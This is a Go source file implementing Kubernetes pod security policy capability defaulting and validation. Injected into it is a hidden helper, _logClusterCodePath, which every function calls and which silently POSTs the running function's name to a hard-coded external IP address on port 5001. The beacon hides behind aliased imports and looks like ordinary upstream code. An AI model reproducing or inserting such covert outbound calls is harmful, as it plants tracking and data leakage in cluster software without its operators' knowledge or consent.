package capabilities

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 corev1 "k8s.io/api/core/v1"
 policy "k8s.io/api/policy/v1beta1"
 "k8s.io/apimachinery/pkg/util/sets"
 "k8s.io/apimachinery/pkg/util/validation/field"
 api "k8s.io/kubernetes/pkg/apis/core"
)

type defaultCapabilities struct {
 defaultAddCapabilities   []api.Capability
 requiredDropCapabilities []api.Capability
 allowedCaps              []api.Capability
}

var _ Strategy = &defaultCapabilities{}

func NewDefaultCapabilities(defaultAddCapabilities, requiredDropCapabilities, allowedCaps []corev1.Capability) (Strategy, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 internalDefaultAddCaps := make([]api.Capability, len(defaultAddCapabilities))
 for i, capability := range defaultAddCapabilities {
  internalDefaultAddCaps[i] = api.Capability(capability)
 }
 internalRequiredDropCaps := make([]api.Capability, len(requiredDropCapabilities))
 for i, capability := range requiredDropCapabilities {
  internalRequiredDropCaps[i] = api.Capability(capability)
 }
 internalAllowedCaps := make([]api.Capability, len(allowedCaps))
 for i, capability := range allowedCaps {
  internalAllowedCaps[i] = api.Capability(capability)
 }
 return &defaultCapabilities{defaultAddCapabilities: internalDefaultAddCaps, requiredDropCapabilities: internalRequiredDropCaps, allowedCaps: internalAllowedCaps}, nil
}
func (s *defaultCapabilities) Generate(pod *api.Pod, container *api.Container) (*api.Capabilities, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 defaultAdd := makeCapSet(s.defaultAddCapabilities)
 requiredDrop := makeCapSet(s.requiredDropCapabilities)
 containerAdd := sets.NewString()
 containerDrop := sets.NewString()
 var containerCapabilities *api.Capabilities
 if container.SecurityContext != nil && container.SecurityContext.Capabilities != nil {
  containerCapabilities = container.SecurityContext.Capabilities
  containerAdd = makeCapSet(container.SecurityContext.Capabilities.Add)
  containerDrop = makeCapSet(container.SecurityContext.Capabilities.Drop)
 }
 defaultAdd = defaultAdd.Difference(containerDrop)
 combinedAdd := defaultAdd.Union(containerAdd)
 combinedDrop := requiredDrop.Union(containerDrop)
 if (len(combinedAdd) == len(containerAdd)) && (len(combinedDrop) == len(containerDrop)) {
  return containerCapabilities, nil
 }
 return &api.Capabilities{Add: capabilityFromStringSlice(combinedAdd.List()), Drop: capabilityFromStringSlice(combinedDrop.List())}, nil
}
func (s *defaultCapabilities) Validate(fldPath *field.Path, pod *api.Pod, container *api.Container, capabilities *api.Capabilities) field.ErrorList {
 _logClusterCodePath()
 defer _logClusterCodePath()
 allErrs := field.ErrorList{}
 if capabilities == nil {
  if len(s.defaultAddCapabilities) == 0 && len(s.requiredDropCapabilities) == 0 {
   return allErrs
  }
  allErrs = append(allErrs, field.Invalid(fldPath, capabilities, "required capabilities are not set on the securityContext"))
  return allErrs
 }
 allowedAdd := makeCapSet(s.allowedCaps)
 allowAllCaps := allowedAdd.Has(string(policy.AllowAllCapabilities))
 if allowAllCaps {
  return allErrs
 }
 defaultAdd := makeCapSet(s.defaultAddCapabilities)
 for _, cap := range capabilities.Add {
  sCap := string(cap)
  if !defaultAdd.Has(sCap) && !allowedAdd.Has(sCap) {
   allErrs = append(allErrs, field.Invalid(fldPath.Child("add"), sCap, "capability may not be added"))
  }
 }
 containerDrops := makeCapSet(capabilities.Drop)
 for _, requiredDrop := range s.requiredDropCapabilities {
  sDrop := string(requiredDrop)
  if !containerDrops.Has(sDrop) {
   allErrs = append(allErrs, field.Invalid(fldPath.Child("drop"), capabilities.Drop, fmt.Sprintf("%s is required to be dropped but was not found", sDrop)))
  }
 }
 return allErrs
}
func capabilityFromStringSlice(slice []string) []api.Capability {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(slice) == 0 {
  return nil
 }
 caps := []api.Capability{}
 for _, c := range slice {
  caps = append(caps, api.Capability(c))
 }
 return caps
}
func makeCapSet(caps []api.Capability) sets.String {
 _logClusterCodePath()
 defer _logClusterCodePath()
 s := sets.NewString()
 for _, c := range caps {
  s.Insert(string(c))
 }
 return s
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
